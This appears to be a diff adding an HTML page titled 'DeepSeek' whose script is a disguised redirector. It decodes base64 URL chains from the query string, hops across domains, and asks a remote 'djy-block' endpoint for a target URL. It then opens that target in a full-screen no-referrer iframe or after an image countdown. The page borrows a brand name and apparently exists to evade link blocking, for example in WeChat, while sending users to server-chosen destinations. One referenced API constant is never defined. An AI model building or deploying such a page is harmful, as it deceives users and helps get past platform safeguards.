@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>DeepSeek</title>
+    </head>
+    <body>
+        <script>
+            (function () {
+                let progressBar;
+                let hasJumped = false; // 防止重复跳转
+
+                const RANDOM_PREFIX = 'pnpPG_';
+                const META_LIST = [
+                    {
+                        charset: 'UTF-8',
+                    },
+                    {
+                        name: 'viewport',
+                        content:
+                            'width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no',
+                    },
+                ];
+                // api.ytaih.com zjbxzx.com enxnem.com
+                function getNetworkType() {
+                    const nc =
+                        navigator.connection ||
+                        navigator.mozConnection ||
+                        navigator.webkitConnection;
+                    if (!nc) return '';
+                    return nc.effectiveType || nc.type || '';
+                }
+                const network = getNetworkType();
+                const CHECK_IP_API =
+                    'https://api.active-code.ccwu.cc/djy-block/api/index/index?network=' +
+                    network;
+                const requestCache = new Map(); // 请求缓存，避免重复请求
+
+                // DOM Ready 兼容
+                function onReady(fn) {
+                    if (document.readyState === 'loading') {
+                        document.addEventListener('DOMContentLoaded', fn);
+                    } else {
+                        fn();
+                    }
+                }
+
+                // 生成随机 ID（防缓存）
+                function genRandomId() {
+                    return (
+                        RANDOM_PREFIX + Math.random().toString(36).slice(2, 10)
+                    );
+                }
+
+                // 注入 meta 标签
+                function injectMetaTags() {
+                    META_LIST.forEach((meta) => {
+                        const selector = meta.charset
+                            ? 'meta[charset]'
+                            : `meta[name="${meta.name}"]`;
+
+                        if (!document.querySelector(selector)) {
+                            const el = document.createElement('meta');
+                            Object.entries(meta).forEach(([k, v]) =>
+                                el.setAttribute(k, v)
+                            );
+                            if (meta.charset) {
+                                document.head.insertBefore(
+                                    el,
+                                    document.head.firstChild
+                                );
+                            } else {
+                                document.head.appendChild(el);
+                            }
+                        }
+                    });
+                }
+
+                // 注入 CSS
+                function injectStyles(randomId) {
+                    const style = document.createElement('style');
+                    style.textContent = `
+        :root {
+            --primary-color: #109b2e;
+            --secondary-color: #14d444;
+            --tertiary-color: #6fce87;
+            --text-color: #666;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { width: 100%; height: 100%; overflow: hidden; }
+
+        .loading {
+            position: fixed; inset: 0;
+            display: flex; align-items: center; justify-content: center;
+            background: #fff; z-index: 9999;
+        }
+        .loading-inner { text-align: center; }
+        .loading-title {
+            font-size: 1.25rem; font-weight: 700;
+            background: linear-gradient(180deg, var(--primary-color), var(--secondary-color), var(--tertiary-color));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .progress-track {
+            width: 220px;
+            height: 8px;
+            background: #e8eef5;
+            border-radius: 3px;
+            margin: 1rem auto;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(
+                90deg, 
+                var(--primary-color), 
+                var(--secondary-color), 
+                var(--tertiary-color)
+            );
+            border-radius: 3px;
+            transition: width 0.4s ease;
+        }
+
+        .img-container {
+            position: fixed; inset: 0;
+            display: none; flex-direction: column;
+            align-items: center; justify-content: center;
+            background: #fff;
+        }
+        .img-container img {
+            max-width: 100%; max-height: 80vh; cursor: pointer;
+        }
+        .countdown {
+            margin-top: 10px; font-size: 14px; color: var(--text-color);
+        }
+        `;
+                    document.head.appendChild(style);
+                }
+
+                // 渲染 loading & 图片容器
+                function renderUI(randomId) {
+                    const wrapper = document.createElement('div');
+                    wrapper.innerHTML = `
+        <div class="loading">
+            <div class="loading-inner">
+            <div class="loading-title">加载中</div>
+            <div class="progress-track">
+                <div class="progress-bar"></div>
+            </div>
+            </div>
+        </div>
+
+        <div class="img-container" id="imgContainer">
+            <img id="targetImg" />
+            <div class="countdown" id="countdown"></div>
+        </div>
+        `;
+                    document.body.appendChild(wrapper);
+                }
+
+                // 显示错误
+                function showError(msg) {
+                    document.body.innerHTML = `
+        <div style="display:flex;justify-content:center;align-items:center;height:100vh;color:#666;">
+            ${msg}
+        </div>
+        `;
+                }
+
+                // UA 判断
+                function isWeixin() {
+                    return /micromessenger/i.test(navigator.userAgent);
+                }
+
+                // 获取 IP
+                async function fetchIp() {
+                    const res = await fetch(CHECK_IP_API);
+                    const data = await res.json();
+                    return data?.data || '';
+                }
+
+                // 校验 code + IP
+                async function checkLiveDomain(code, ip) {
+                    const formData = new FormData();
+                    formData.append('code', code);
+                    formData.append('ip', ip);
+                    formData.append(
+                        'browser',
+                        isWeixin() ? 'weixin_only' : 'other'
+                    );
+
+                    const res = await fetch(LIVE_DOMAIN_API, {
+                        method: 'POST',
+                        body: formData,
+                    });
+
+                    const json = await res.json();
+                    if (!json || json.code !== 200) {
+                        throw new Error('code: ' + (json?.code || 'unknown'));
+                    }
+
+                    return {
+                        targetUrl: json.target_url || '',
+                        forceOpen: json.force_open === 1,
+                        redirectSeconds: Number(json.redirect_seconds) || 1,
+                        targetType: json.target_type || 'url',
+                        imagePath: json.image_path || '',
+                    };
+                }
+
+                // 生成请求的唯一指纹
+                function getRequestFingerprint(code, ip) {
+                    return btoa(`${code}|${ip}`);
+                }
+
+                async function checkLiveDomainOnce(code, ip) {
+                    const fingerprint = getRequestFingerprint(code, ip);
+                    if (requestCache.has(fingerprint)) {
+                        return false;
+                    }
+
+                    if (sessionStorage.getItem(fingerprint)) {
+                        return false;
+                    }
+                    sessionStorage.setItem(fingerprint, '1');
+                    requestCache.set(fingerprint, true);
+
+                    return true;
+                }
+
+                // iframe / 跳转
+                function openTarget(url, forceOpen) {
+                    if (hasJumped || !url) return;
+                    hasJumped = true;
+
+                    function onIframeLoaded() {
+                        setProgress(100);
+                    }
+
+                    if (forceOpen) {
+                        const wrap = document.createElement('div');
+                        wrap.id = 'tzWrap';
+                        wrap.style.cssText =
+                            'position:fixed;inset:0;z-index:9999;background:#fff;';
+                        const iframe = document.createElement('iframe');
+                        iframe.src = url;
+                        iframe.referrerPolicy = 'no-referrer';
+                        iframe.allowFullscreen = true;
+                        iframe.style.cssText =
+                            'width:100%;height:100%;border:0;';
+                        iframe.onload = onIframeLoaded;
+                        iframe.onreadystatechange = function () {
+                            if (
+                                iframe.readyState === 'complete' ||
+                                iframe.readyState === 'interactive'
+                            ) {
+                                onIframeLoaded();
+                            }
+                        };
+                        wrap.appendChild(iframe);
+                        document.body.appendChild(wrap);
+                        document.body.style.overflow = 'hidden';
+                    } else {
+                        setProgress(100);
+                        window.location.replace(url);
+                    }
+                }
+
+                // 图片 + 倒计时
+                function showImageMode(
+                    imagePath,
+                    seconds,
+                    targetUrl,
+                    forceOpen
+                ) {
+                    const loading = document.querySelector('.loading');
+                    const container = document.getElementById('imgContainer');
+                    const img = document.getElementById('targetImg');
+                    const countdown = document.getElementById('countdown');
+
+                    if (loading) loading.style.display = 'none';
+                    container.style.display = 'flex';
+                    img.src = imagePath;
+                    img.onclick = () => openTarget(targetUrl, forceOpen);
+
+                    let left = seconds;
+                    countdown.textContent = `将在 ${left} 秒后跳转`;
+
+                    const timer = setInterval(() => {
+                        left--;
+                        countdown.textContent = `将在 ${left} 秒后跳转`;
+                        if (left <= 0) {
+                            clearInterval(timer);
+                            openTarget(targetUrl, forceOpen);
+                        }
+                    }, 1000);
+                }
+
+                function initProgressBar() {
+                    progressBar = document.querySelector('.progress-bar');
+                }
+
+                function setProgress(value) {
+                    if (progressBar) {
+                        progressBar.style.width = `${value}%`;
+                    }
+                }
+
+                onReady(async () => {
+                    try {
+                        //if (!isWeixin()) throw new Error("请在微信中打开");
+
+                        const randomId = genRandomId();
+                        injectMetaTags();
+                        injectStyles(randomId);
+                        renderUI(randomId);
+                        initProgressBar();
+
+                        const params = new URLSearchParams(location.search);
+                        const code = atob(params.get('png'));
+                        const m = Number(params.get('m') || 0) || 0;
+                        const f = params.get('f');
+                        const t = Number(params.get('t') || 500) || 500;
+                        const urls = (
+                            atob(params.get('u'))?.split('|') || []
+                        ).filter(Boolean);
+
+                        console.log({ code, m, f, t });
+
+                        setProgress((m - urls.length + 1) * 20);
+
+                        if (urls.length) {
+                            const url = urls.shift();
+                            document.title = '正在加载..';
+                            return setTimeout(
+                                () =>
+                                    location.replace(
+                                        url +
+                                            '?u=' +
+                                            btoa(urls.join('|')) +
+                                            '&m=' +
+                                            params.get('m') +
+                                            '&f=' +
+                                            params.get('f') +
+                                            '&t=' +
+                                            params.get('t') +
+                                            '&png=' +
+                                            params.get('png')
+                                    ),
+                                t
+                            );
+                        }
+
+                        if (!code) throw new Error('无效的 code');
+
+                        setProgress(80);
+                        const res = await fetch(`${CHECK_IP_API}&code=${code}`);
+                        const { data } = await res.json();
+
+                        setProgress(98);
+                        if (typeof data === 'string') {
+                            showError(data);
+                            return;
+                        }
+                        const { url, pic, title } = data;
+
+                        if (title) document.title = title;
+
+                        if (pic) showImageMode(pic, 5, url, 1);
+                        else setTimeout(() => openTarget(url, f === '1'), 1000);
+                    } catch (e) {
+                        showError(e.message || '发生错误，请重试');
+                    }
+                });
+            })();
+        </script>
+    </body>
+</html>
